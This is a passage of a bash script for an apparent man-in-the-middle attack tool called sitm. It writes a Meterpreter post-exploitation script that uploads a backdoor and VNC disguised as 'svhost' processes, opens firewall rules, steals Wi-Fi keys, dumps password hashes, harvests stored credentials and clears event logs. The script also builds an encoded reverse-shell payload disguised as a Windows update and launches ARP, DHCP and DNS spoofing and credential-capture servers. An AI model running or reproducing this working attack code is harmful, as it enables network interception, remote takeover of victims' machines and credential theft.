      if [ "$displayMore" == "true" ]; then display action "Copying www/"; fi
      mkdir -p $www
      action "mkdir $www && Copying www/" "cp -rf www/* $www/"
   fi
   if [ ! -e "$www/index.php" ]; then
      display error "Missing index.php. Did you run: cp -rf www/* $www/" 1>&2
      cleanUp
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment"

#----------------------------------------------------------------------------------------------#
cleanUp remove

#----------------------------------------------------------------------------------------------#
#if [ "$displayMore" == "true" ]; then display action "Stopping: Programs"; fi
#action "Killing perograms" "killall airbase-ng hostapd xterm wpa_action wpa_supplicant wpa_cli dhclient ifplugd dhcdbd dhcpcd NetworkManager knetworkmanager avahi-autoipd avahi-daemon wlassistant wifibox" # wicd-client
if [ "$displayMore" == "true" ]; then display action "Stopping: Daemons"; fi
command="/etc/init.d/dhcp3-server stop; /etc/init.d/apparmor stop"
if [ "$mode" == "flip" ]; then command="$command; /etc/init.d/squid stop"; fi
if [ "$mode" != "normal" ]; then command="$command; /etc/init.d/apache2 stop"; fi
#command="$command; /etc/init.d/wicd stop; service network-manager stop" # Backtrack & Ubuntu
action "Killing services" "$command"

#----------------------------------------------------------------------------------------------#
#action "Refreshing interface" "ifconfig $interface up && sleep 1"
#if [ -z "$ourIP" ]; then ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}'); fi

#command=$(ifconfig | grep -o "$interface")
#if [ "$command" != "$interface" ]; then display error "Can't detect interface ($interface)" 1>&2; cleanUp; fi # Check to make sure $interface came up or if its correct

#if [ -z "$ourIP" ]; then
#   action "Acquiring IP" "dhclient $interface && sleep 3"
#   command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
#   if [ -z "$command" ]; then
#      display error "Haven't got an IP address on $interface" 1>&2
#      cleanUp
#   else
#      ourIP="$command"
#   fi
#fi

command=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
if [ -z "$command" ] && [ -z "$gateway" ] ; then
   display error "Can't detect the gateway" 1>&2
else
   gateway="$command"
fi

#----------------------------------------------------------------------------------------------#
if [ "$macMode" != "false" ]; then
   if [ "$displayMore" == "true" ]; then display action "Configuring: MAC address"; fi
   command="ifconfig $interface down &&"
   if [ "$macMode" == "random" ]; then command="$command macchanger -A $interface &&"
   elif [ "$macMode" == "set" ]; then command="$command macchanger -m $fakeMac $interface &&"; fi
   command="$command ifconfig $interface up"
   action "Configuring MAC" "$command"
   command=$(macchanger --show $interface)
   mac=$(echo $command | awk -F " " '{print $3}')
   macType=$(echo $command | awk -F "Current MAC: " '{print $2}')
   if [ "$displayMore" == "true" ]; then display info "mac=$macType"; fi
fi

#-----------------------------------------------------------------------------------
#command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
#if [ -z "$command" ]; then
#   action "Acquiring IP" "dhclient $interface && sleep 3"
#   command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
#   if [ -z "$command" ]; then
#      display error "Lost the IP address on $interface" 1>&2
#      cleanUp
#   else
#      ourIP=$command
#   fi
#fi

#command=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
#if [ -z "$command" ] && [ ! -z "$gateway" ] ; then
#   #action "Resetting gateway" "route add default gw $gateway"
#   command=$(route -n | grep $interface | awk '/^0.0.0.0/ {getline; print $2}')
#   if [ -z $command ]; then display error "Lost the gateway" 1>&2; fi
#else
#   gateway=$command
#fi

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts"
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   path="/tmp/sitm.rb" # metasploit script
   if [ -e "$path" ]; then rm "$path"; fi
   echo "# ID: sitm.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com
################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0
######################## Functions ########################
def doLinux
   print_status(\"Coming soon\")
end
def doOSX
   print_status(\"Coming soon\")
end
def doWindows(uac)
   session.response_timeout=120
   begin" >> $path
   if [ "$payload" == "vnc" ]; then echo "      print_status(\"   Stopping: winvnc.exe\")
      session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
      sleep(1)

      print_status(\"  Uploading: VNC\")
      exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
      upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
      upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
      sleep(1)

      print_status(\"Configuring: VNC\")
      execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\\\vnc.reg\", nil)
      sleep(1)

      print_status(\"  Bypassing: Firewall\")
      execute(session,\"cmd.exe /C netsh advfirewall firewall add rule name=\\\"svhost101.exe\\\" dir=in program=\\\"#{exec}\\\" action=allow\", nil)
      sleep(1)

      if uac == 1
         print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\" (UAC)\")
         sleep(30)
      end

      print_status(\"  Executing: winvnc (#{exec})\")
      execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
      sleep(1)

      print_status(\"Configuring: VNC (Reserving connection)\")
      execute(session,\"cmd.exe /C #{exec} -connect $ourIP\", nil)

      print_status(\"   Deleting: Traces\")
      delete(session, \"%SystemDrive%\\\vnc.reg\")" >> $path
   elif [ "$payload" == "sbd" ]; then echo "    print_status(\" Stopping: sbd.exe\")
      session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
      sleep(1)

      print_status(\"Uploading: SecureBackDoor\")
      exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
      sleep(1)

      print_status(\"Bypassing: Firewall\")
      execute(session,\"cmd.exe /C netsh advfirewall firewall add rule name=\\\"vhost102.exe\\\" dir=in program=\\\"#{exec}\\\" security=authenticate action=allow\", nil)
      sleep(1)

      print_status(\"Executing: sbd (#{exec})\")
      execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port $ourIP\", nil)" >> $path
   elif [ "$payload" == "wkv" ]; then echo " print_status(\"  Uploading: WirelessKeyView\")
      if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
         exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
      else
         exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
      end
      sleep(1)

      print_status(\"  Executing: wkv (#{exec})\")
      execute(session,\"cmd.exe /C #{exec} /stext %TEMP%\\\wkv.txt\", nil)
      sleep(1)

      if uac == 1
         print_status(\"    Waiting: 30 seconds the for the target to click \\\"yes\\\" (UAC)\")
         sleep(30)
      end

      # Check for file!
      print_status(\"Downloading: WiFi keys (/tmp/sitm.wkv)\")
      session.fs.file.download_file(\"/tmp/sitm.wkv\", \"%TEMP%\\\wkv.txt\")

      print_status(\"   Deleting: Traces\")
      delete(session, exec)
      delete(session, \"%TEMP%\\\wkv.txt\")" >> $path
   else echo "    print_status(\"Stopping: backdoor.exe\")
      session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
      sleep(1)

      print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
      exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
      sleep(1)

      print_status(\"Bypassing: Firewall\")
      execute(session,\"cmd.exe /C netsh advfirewall firewall add rule name=\\\"svhost103.exe\\\" dir=in program=\\\"#{exec}\\\" action=allow\", nil)
      sleep(1)

      print_status(\"Executing: backdoor\")
      execute(session,\"cmd.exe /C #{exec}\", nil)" >> $path
   fi
   echo "      sleep(1)
      return

   rescue ::Exception => e
      print_status(\"Error: #{e.class} #{e}\")
   end
end
def upload(session,file,filename = \"\",trgloc = \"\")
   if not ::File.exists?(file)
      raise \"File to upload does not exists!\"
   else
      if trgloc == \"\"
         location = session.fs.file.expand_path(\"%TEMP%\")
      else
         location = trgloc
      end
      begin
         if filename == \"\"
            ext = file[file.rindex(\".\") .. -1]
            if ext and ext.downcase == \".exe\"
               fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
            else
               fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
            end
         else
            fileontrgt = \"#{location}\\\#{filename}\"
         end
         session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
      rescue ::Exception => e
         print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
      end
   end
   return fileontrgt
end
def execute(session,cmdexe,opt)
   r=''
   session.response_timeout=120
   begin
      r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
      r.close
   rescue ::Exception => e
      print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
   end
end
def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end
def checkUAC(session)
   begin
      open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
      value = open_key.query_value(\"EnableLUA\").data
   rescue ::Exception => e
      print_status(\"Error Checking UAC: #{e.class} #{e}\")
   end
   return (value)
end
########################### Main ##########################
print_line(\"[*] sitm $version\")" >> $path
   #if | [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ||  [ "$debug" == "true" ]; then
      echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"Host: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
   uac = checkUAC(session)
   if uac == 1
      print_error(\" UAC: Enabled\")
      session.core.use(\"priv\")
      #run kitrap0d # x86 ONLY
      #client.execute_script(\"script\",\"args\") #client.execute_script(\"multi_console_command\",[\"-cl\",'help,help\"])
   else
      print_status(\" UAC: Disabled\")
   end
end
print_status(\"Arch: #{arch}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> $path
   #fi
   echo "if os =~ /Linux/
   doLinux
elsif os =~ /OSX/
   doOSX
elsif os =~ /Windows/
#  run getcountermeasure.rb -d
   doWindows(uac)
else
   print_error(\"Unsupported OS\")
   exit
end
print_status(\"Unlocking: sitm\")
output = ::File.open(\"/tmp/sitm.lock\", \"a\")
output.puts(\"sitm\")
output.close
sleep(1)" >> $path
   if [ "$extras" == "true" ]; then echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
session.core.use(\"priv\") #use priv
getsystem
hashes = session.priv.sam_hashes  #hashdump #> /tmp/sitm.hash
####################################################################
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes \")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
####################################################################
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> $path
   fi
   echo "print_line(\"[*] Done!\")" >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "flip" ]; then
   path="/tmp/sitm.pl" # Squid script
   if [ -e "$path" ]; then rm "$path"; fi
   echo -e "#!/usr/bin/perl
# sitm.pl v$version
$|=1;
\$count = 0;
\$pid = \$\$;
while (<>) {
   chomp \$_;
   if (\$_ =~ /(.*\.jpg)/i) {
      \$url = \$1;
      system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpg\", \"\$url\");
      system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpg\");
      system(\"chmod\", \"666\", \"$www/images/\$pid-\$count.jpg\");
      print \"http://$ourIP/images/\$pid-\$count.jpg\\\n\";
   }
   elsif (\$_ =~ /(.*\.jpeg)/i) {
      \$url = \$1;
      system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/images/\$pid-\$count.jpeg\", \"\$url\");
      system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.jpeg\");
      system(\"chmod\", \"666\", \"$www/\$pid-\$count.jpeg\");
      print \"http://$ourIP/images/\$pid-\$count.jpeg\\\n\";
   }
   elsif (\$_ =~ /(.*\.gif)/i) {
      \$url = \$1;
      system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.gif\", \"\$url\");
      system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.gif\");
      system(\"chmod\", \"666\", \"$www/\$pid-\$count.gif\");
      print \"http://$ourIP/images/\$pid-\$count.gif\\\n\";
   }
   elsif (\$_ =~ /(.*\.png)/i) {
      \$url = \$1;
      system(\"/usr/bin/wget\", \"-q\", \"-O\",\"$www/\$pid-\$count.png\", \"\$url\");
      system(\"/usr/bin/mogrify\", \"-flip\",\"$www/images/\$pid-\$count.png\");
      system(\"chmod\", \"666\", \"$www/\$pid-\$count.png\");
      print \"http://$ourIP/images/\$pid-\$count.png\\\n\";
   }
   else {
      print \"\$_\\\n\";;
   }
   \$count++;
}" >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi

#----------------------------------------------------------------------------------------------#
   if [ -e "$path" ]; then rm "$path"; fi
   # Have to use ', instead of "
   echo '# sitm.squid v$version
hierarchy_stoplist cgi-bin ?
acl QUERY urlpath_regex cgi-bin \?
no_cache deny QUERY
hosts_file /etc/hosts
url_rewrite_program /tmp/sitm.pl
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320
acl all src all
acl localhost src 127.0.0.1/32
acl to_localhost dst 127.0.0.0/8
acl localnet src 10.0.0.0/8
acl manager proto cache_object
acl SSL_ports port 443          # https
acl SSL_ports port 563          # snews
acl SSL_ports port 873          # rsync
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl Safe_ports port 631         # cups
acl Safe_ports port 873         # rsync
acl Safe_ports port 901         # SWAT
acl purge method PURGE
acl CONNECT method CONNECT
http_access allow manager localhost
http_access deny manager
http_access allow purge localhost
http_access deny purge' > $path
  echo 'http_access deny !Safe_ports' >> $path
  echo 'http_access deny CONNECT !SSL_ports' >> $path
  echo 'http_access allow localnet
http_access allow localhost
http_access deny all
http_reply_access allow all
icp_access deny all
http_port 3128 transparent
visible_hostname myclient.hostname.com
access_log /var/log/squid/access.log squid
acl apache rep_header Server ^Apache
broken_vary_encoding allow apache
extension_methods REPORT MERGE MKACTIVITY CHECKOUT
coredump_dir /var/spool/squid' >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ]; then
   path="/etc/apache2/sites-available/sitm"
   if [ -e "$path" ]; then rm "$path"; fi # Apache (Virtual host)
   echo "# sitm v$version
   <VirtualHost *:80>
      ServerAdmin webmaster@localhost
      DocumentRoot $www
      ServerName \"$ourIP\"
      <Directory />
         Options FollowSymLinks
         AllowOverride None
      </Directory>
      <Directory $www>
         Options Indexes FollowSymLinks MultiViews
         AllowOverride None
         Order allow,deny
         allow from all
      </Directory>
      ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
      <directory \"/usr/lib/cgi-bin\">
         AllowOverride None
         Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
         Order allow,deny
         Allow from all
      </directory>
      ErrorLog /tmp/sitm-apache-error.log
      LogLevel warn
      CustomLog /tmp/sitm-apache-access.log combined
      ErrorDocument 403 /index.php
      ErrorDocument 404 /index.php
   </VirtualHost>
   <IfModule mod_ssl.c>
      <VirtualHost _default_:443>
         ServerAdmin webmaster@localhost
         DocumentRoot $www
         ServerName \"$ourIP\"
         <Directory />
            Options FollowSymLinks
            AllowOverride None
         </Directory>
         <Directory $www>
            Options Indexes FollowSymLinks MultiViews
            AllowOverride None
            Order allow,deny
            allow from all
         </Directory>
         <directory \"/usr/lib/cgi-bin\">
            AllowOverride None
            Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
            Order allow,deny
            Allow from all
         </directory>
         ErrorLog /tmp/sitm-apache-error2.log
         LogLevel warn
         CustomLog /tmp/sitm-apache-access-ssl.log combined
         ErrorDocument 403 /index.php
         ErrorDocument 404 /index.php
         SSLEngine on
         SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
         SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
         <FilesMatch \"\.(cgi|shtml|phtml|php)$\">
            SSLOptions +StdEnvVars
         </FilesMatch>
         <Directory /usr/lib/cgi-bin>
            SSLOptions +StdEnvVars
         </Directory>
         BrowserMatch \"MSIE [2-6]\" \
            nokeepalive ssl-unclean-shutdown \
            downgrade-1.0 force-response-1.0
         BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
      </VirtualHost>
   </IfModule>" >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   path="/tmp/sitm.dns" # DNS script
   if [ -e "$path" ]; then rm "$path"; fi
   echo -e "# sitm.dns v$version\n$ourIP *" >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$payload" == "autopwn" ]; then
   path="/tmp/sitm.rc" # Metasploit script
   if [ -e "$path" ]; then rm "$path"; fi
   echo "# sitm.rc v$version
db_destroy sitm
db_create sitm
db_nmap $target
db_autopwn -t -p -e
sessions -l

use auxiliary/server/browser_autopwn
set LHOST $ourIP
set LPORT 45000
set SRVPORT 55550
run

#mail
use auxiliary/server/capture/pop3
set SRVPORT 110
set SSL false
run
use auxiliary/server/capture/pop3
set SRVPORT 995
set SSL true
run
use auxiliary/server/capture/imap
set SSL false
set SRVPORT 143
run
use auxiliary/server/capture/imap
set SSL true
set SRVPORT 993
run
use auxiliary/server/capture/smtp
set SSL false
set SRVPORT 25
run
use auxiliary/server/capture/smtp
set SSL true
set SRVPORT 465
run

#Plantext
use auxiliary/server/capture/ftp
run
use auxiliary/server/capture/telnet
run
use auxiliary/server/capture/http
set SRVPORT 8080
set BGIMAGE /msf3/load.gif
set SSL false
run
use auxiliary/server/capture/http
set SRVPORT 443
set BGIMAGE /msf3/load.gif
set SSL true
run
use auxiliary/server/capture/http
set SRVPORT 8443
set BGIMAGE /msf3/load.gif
set SSL true
run

#smb
use auxiliary/server/capture/smb
set SRVPORT 445
set PWFILE /tmp/sitm.445.hashes
run
use auxiliary/server/capture/smb
set SRVPORT 139
set PWFILE /tmp/sitm.139.hashes
run" >> $path
   if [ "$verbose" == "2" ] ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ]; then cat "$path"; fi
   if [ ! -e "$path" ]; then display error "Couldn't create $path" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   #display faction "Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ]; then echo "Command: /opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=4566 X > $www/kernel_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "sitm v$version - Metasploit (Linux)" "/opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=$ourIP LPORT=4566 X > $www/kernel_1.83.90-5+lenny2_i386.deb"
   #display action "Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ]; then echo "Command: /opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "sitm v$version - Metasploit (OSX)" "/opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"
   display action "Creating: Exploit (Windows)"
   if [ -e "$www/Windows-KB183905-x86-ENU.exe" ]; then rm "$www/Windows-KB183905-x86-ENU.exe"; fi
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe"
   sleep 1
   if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ]; then display error "Failed: Couldn't create exploit" 1>&2; cleanUp; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Network"
ifconfig lo up
echo "1" > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ]; then display error "Can't enable ip_forward" 1>&2; cleanUp; fi
#echo "1" > /proc/sys/net/ipv4/conf/$interface/forwarding

if [ ! -e "/etc/etter.conf" ]; then display error "Failed: Couldn't edit etter.conf" 1>&2; fi
action "BackUP" "cp /etc/etter.conf /etc/etter.conf.bkup"
find="ec_uid = "
replace="ec_uid = 0 #"
sed "s/$find/$replace/g" "/etc/etter.conf" > "/etc/etter.new"
find="ec_gid = "
replace="ec_gid = 0 #"
sed "s/$find/$replace/g" "/etc/etter.new" > "/etc/etter.conf"
find="#redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\""
replace="redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\""
sed "s/$find/$replace/g" "/etc/etter.conf" > "/etc/etter.new"
find="#redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\""
replace="redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\""
sed "s/$find/$replace/g" "/etc/etter.new" > "/etc/etter.conf"
action "Removing temp files" "rm -f /etc/etter.new"

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "flip" ]; then
   mkdir -p "$www/images"
   action "DHCP" "chmod 755 /tmp/sitm.pl; chmod 755 $www/images; chown proxy:proxy $www/images"
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: Attack ($attack)"
if [ "$attack" = "arp" ]; then
#ARPoison, Parasite
   #command="ettercap -Tq -i $interface"
   #if [ "$target" == "$bcast" ]; then command="$command -P autoadd"; fi
   #command="$command -M arp:remote /$gateway/ /$target/"
   #action "ARP" "$command" "true" "0|0|10" & # Don't wait, do the next command
   action "arp" "arpspoof -i $interface -t $target $gateway" "true" "0|0|10" & # Don't wait, do the next command
   sleep 1
elif [ "$attack" = "port" ]; then
#Ettercap (Confusion plugin)
   action "DHCP" "ettercap -Tq -i $interface -M port /$gateway/ /$target/" "true" "0|0|10" & # Don't wait, do the next command
   sleep 1
elif [ "$attack" = "icmp" ]; then
   command=$(ping -c 1 $target > /dev/null; arp $target | awk '!/HWaddress/ {print $3}')
   if [ "$command" == "$interface" ] || [ -z "$command" ]; then display error "Couldn't get MAC address of target ($target)" 1>&2; cleanUp; fi
   action "ICMP" "ettercap -Tq -i $interface -M icmp:$command/$target" "true" "0|0|10" & # Don't wait, do the next command
   sleep 1
elif [ "$attack" = "dhcp" ]; then
   action "DHCP" "ettercap -Tq -i $interface -M dhcp:10.0.0.201-220/255.255.255.0/$ourIP" "true" "0|0|10" & # Don't wait, do the next command
   sleep 1
elif [ "$attack" = "dns" ]; then
#ADM DNS spoofing tools, Zodiac
   #action "dns" "dnsspoof -i $interface -f /tmp/sitm.dns" "true" "0|0|5" & # Don't wait, do the next command
   action "DNS" "ettercap -Tqz -i $interface -P dns_spoof" "true" "0|0|10" & # Don't wait, do the next command
   sleep 1
fi
#ettercap, [-q, --quiet] [-o, --only-mitm] [-z, --silent] [-p, --nopromisc] [u, --unoffensive] -[R, --reversed]

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   display action "Starting: DNS"
   #action "DNS" "dnsspoof -i $interface -f /tmp/sitm.dns" "true" "0|155|5" & # Don't wait, do the next command
   sleep 2
   #iptables --table nat --append PREROUTING --in-interface $interface --proto tcp --destination-port 80  --jump DNAT --to $ourIP:80;
   #iptables --table nat --append PREROUTING --in-interface $interface --proto tcp --destination-port 443 --jump DNAT --to $ourIP:80;
   #iptables --table nat --append PREROUTING --in-interface $interface --proto tcp --jump REDIRECT

#----------------------------------------------------------------------------------------------#
   display action "Starting: Exploit"
   command=$(netstat -ltpn | grep 4565)
   if [ ! -z "$command" ]; then
      display error "Port 4564 isn't free" 1>&2;
      command=$(pgrep ruby)
      action "Killing ruby" "kill $command" # to prevent interference
      sleep 1
      command=$(netstat -ltpn | grep 4565)
      if [ ! -z "$command" ]; then display error "Couldn't free port 4564" 1>&2; cleanUp; fi # Kill it for them?
   fi
   #if [ "$verbose" == "2" ]; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=$ourIP LPORT=4566 AutoRunScript=/tmp/sitm-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "sitm v$version - Metasploit (Linux)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=$ourIP LPORT=4566 AutoRunScript=/tmp/sitm-osx.rb E" &
   #if [ "$verbose" == "2" ]; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 AutoRunScript=/tmp/sitm-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "sitm v$version - Metasploit (OSX)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=$ourIP LPORT=4565 AutoRunScript=/tmp/sitm-linux.rb E" &
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$ourIP LPORT=4564 AutoRunScript=/tmp/sitm.rb INTERFACE=$interface E" "true" "0|265|15" & #ExitOnSession=false # Don't wait, do the next command
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download
   if [ -z "$(pgrep ruby)" ]; then
      display error "Metaspliot failed to start" 1>&2
      if [ "$verbose" == "2" ]; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ]; then echo "killall xterm" >> $logFile; fi
      cleanUp
   fi
elif [ "$mode" == "flip" ]; then
   display action "Starting: Proxy"
   action "squid" "squid -f /tmp/sitm.squid"
   sleep 3
